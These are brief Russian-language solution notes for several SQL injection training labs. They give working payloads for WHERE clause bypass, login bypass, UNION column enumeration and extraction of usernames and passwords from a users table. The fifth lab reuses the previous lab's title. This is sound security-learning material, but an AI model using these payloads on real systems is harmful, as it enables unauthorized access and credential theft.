
<b>Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</b>
  1. Видим, что при переходе по какому-то фильтру у нас идёт SQL запрос прямо из URL
  2. Вставляем туда кавычек и черточек filter?category=Corporate+gifts' OR 1=1 --
  3. Успех
  
<b>Lab: SQL injection vulnerability allowing login bypass</b>
  1. Переходим по ссылке регистрации
  2. Вместо логина пишем administrator, вместо пароля пишем ' OR 1=1 --
  3. Успех

<b>Lab: SQL injection UNION attack, determining the number of columns returned by the query</b>
  1. Выбираем любую категорию
  2. '-- возвращают тот же результат
  3. Дописываем мжду ними UNION SELECT и пытаемся подобрать колличество столбцов, путем перечисления NULL после SELECT
  4. ' UNION SELECT NULL, NULL , NULL -- подходит 
  5. Успех
  

<b>Lab: SQL injection UNION attack, finding a column containing text</b>
  1. Из предыдушей лабы мы нашли количество столбцов - теперь перебором найдем столбец, который отвечает за текст
  2. category=Accessories' UNION SELECT NULL, '0OmNnF', 1 --
  3. Успех

<b>Lab: SQL injection UNION attack, finding a column containing text</b>
  1. Используем уязвимость к union атакам 
  2. Прибавляем к url сategory=Corporate+gifts' UNION SELECT username, password FROM users --
  3. В строках с описанием находим пароль администратора
  4. Вставляем это в форму
  5. Успех
  ![alt text](https://raw.githubusercontent.com/StonePardon/Hack_all_the_things/master/SQL/mmm_admin.png)
